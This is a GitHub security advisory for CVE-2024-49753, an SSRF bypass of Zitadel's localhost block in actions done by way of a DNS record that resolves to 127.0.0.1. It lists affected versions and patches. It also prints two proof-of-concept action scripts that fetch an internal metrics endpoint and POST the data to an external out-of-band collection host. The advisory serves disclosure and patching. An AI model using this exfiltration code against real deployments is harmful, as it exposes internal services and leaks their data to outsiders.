# [M] Denied Host Validation Bypass in Zitadel Actions

## Summary
Severity: Medium
Advisory: GHSA-6cf5-w9h3-4rqv
CVE: CVE-2024-49753
CWE: CWE-20
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2024-10-25
Source: https://github.com/advisories/GHSA-6cf5-w9h3-4rqv
Type: github-advisory

## Affected
- Go: `github.com/zitadel/zitadel` — affected >=2.64.0 <2.64.1
- Go: `github.com/zitadel/zitadel` — affected >=2.63.0 <2.63.6
- Go: `github.com/zitadel/zitadel` — affected >=2.62.0 <2.62.8
- Go: `github.com/zitadel/zitadel` — affected >=2.61.0 <2.61.4
- Go: `github.com/zitadel/zitadel` — affected >=2.60.0 <2.60.4
- Go: `github.com/zitadel/zitadel` — affected >=2.59.0 <2.59.5
- Go: `github.com/zitadel/zitadel` — affected >=1.80.1 <2.58.7
- Go: `github.com/zitadel/zitadel` — affected >=0 <0.0.0-20241022141644-79fb4cc1cc6e
- Go: `github.com/zitadel/zitadel` — affected >=0.0.0 <1.80.0-v2.20.0.20241022141644-79fb4cc1cc6e

## Details
### Summary
A flaw in the URL validation mechanism of Zitadel actions allows bypassing restrictions intended to block requests to localhost (127.0.0.1).  The isHostBlocked check, designed to prevent such requests, can be circumvented by creating a DNS record that resolves to 127.0.0.1. This enables actions to send requests to localhost despite the intended security measures.

### Details
While attempting to send a request directly to 127.0.0.1 via an action results in an error (see image below), the restriction can be bypassed using a custom DNS record.
<img width="781" alt="image" src="https://github.com/user-attachments/assets/6d22dae8-407f-4420-a937-aca53d22d05d">

The relevant action code demonstrates the attempted request to 127.0.0.1:
```
let http = require('zitadel/http')
let logger = require("zitadel/log")
function make_api_call(ctx, api) {
    var user = http.fetch('http://127.0.0.1:8080/debug/metrics');

    var api_r = http.fetch('https://obtjoiwgtaftuhbjugulyolvvxuvuuosq.oast.fun/test', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            'data': user,
        }),
    });
    logger.log(api_r.body);
}
```

By creating a DNS record that resolves a custom domain to 127.0.0.1 (illustrated below using messwithdns), the action can successfully send the request.
![image](https://github.com/user-attachments/assets/d1544a7c-684a-485c-8857-eb846ba946b7)

The modified action code uses the custom domain instead of 127.0.0.1:
```
let http = require('zitadel/http')
let logger = require("zitadel/log")
function make_api_call(ctx, api) {
    var user = http.fetch('http://ok.jelly244.messwithdns.com:8080/debug/metrics');

    var api_r = http.fetch('https://obtjoiwgtaftuhbjugulyolvvxuvuuosq.oast.fun/test', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            'user': user,
        }),
    });
    logger.log(api_r.body);
}
```

![image](https://github.com/user-attachments/assets/5a1c720b-fdda-4e7a-b0e0-ec29bff6690e)

This demonstrates that data from the /debug/metrics API, intended to be restricted to localhost, can be fetched and sent to an external endpoint.
![image](https://github.com/user-attachments/assets/c8e6abe4-5d2c-48d9-ba0f-dacae38ba0be)

## Impact

This vulnerability potentially allows unauthorized access to unsecured internal endpoints, which may contain sensitive information or functionalities.
## Patches

2.x versions are fixed on >= [2.64.1](https://github.com/zitadel/zitadel/releases/tag/v2.64.1)
2.63.x versions are fixed on >= [2.63.6](https://github.com/zitadel/zitadel/releases/tag/v2.63.6)
2.62.x versions are fixed on >= [2.62.8](https://github.com/zitadel/zitadel/releases/tag/v2.62.8)
2.61.x versions are fixed on >= [2.61.4](https://github.com/zitadel/zitadel/releases/tag/v2.61.4)
2.60.x versions are fixed on >= [2.60.4](https://github.com/zitadel/zitadel/releases/tag/v2.60.4)
2.59.x versions are fixed on >= [2.59.5](https://github.com/zitadel/zitadel/releases/tag/v2.59.5)
2.58.x versions are fixed on >= [2.58.7](https://github.com/zitadel/zitadel/releases/tag/v2.58.7)

## Workarounds

There is no workaround since a patch is already available.

## Questions

If you have any questions or comments about this advisory, please email us at [security@zitadel.com](mailto:security@zitadel.com)

## Credits

Thanks to @prdp1137 for reporting this!

## References
- https://github.com/zitadel/zitadel/security/advisories/GHSA-6cf5-w9h3-4rqv
- https://nvd.nist.gov/vuln/detail/CVE-2024-49753
- https://github.com/zitadel/zitadel
- https://github.com/zitadel/zitadel/releases/tag/v2.58.7
- https://github.com/zitadel/zitadel/releases/tag/v2.59.5
- https://github.com/zitadel/zitadel/releases/tag/v2.60.4
- https://github.com/zitadel/zitadel/releases/tag/v2.61.4
- https://github.com/zitadel/zitadel/releases/tag/v2.62.8
- https://github.com/zitadel/zitadel/releases/tag/v2.63.6
- https://github.com/zitadel/zitadel/releases/tag/v2.64.1
